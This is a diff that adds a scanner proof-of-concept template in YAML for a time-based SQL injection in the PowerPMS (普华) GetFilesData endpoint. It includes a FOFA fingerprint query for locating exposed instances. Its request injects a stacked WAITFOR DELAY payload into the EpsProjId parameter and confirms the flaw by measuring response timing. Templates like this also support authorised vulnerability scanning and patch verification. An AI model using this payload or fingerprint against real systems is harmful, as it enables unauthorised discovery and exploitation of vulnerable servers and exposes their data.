@@ -1,0 +1,18 @@
+id: poc-yaml-powerpms-getfilesdata-sqli
+info:
+  name: 普华 PowerPMS GetFilesData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: powerpms
+  fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /UploadFle/GetFilesData?EpsProjId=1';WAITFOR+DELAY+'0:0:{{.t1}}'--&StartDate=2&EndDate=2
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":true\") &&\n\
+    contains(body,\"\\\"message\\\":\\\"\\\"\") &&\n!contains(body,\"<\") &&\nduration\
+    \ > t1 &&\nduration < t2\n"
+transport: http
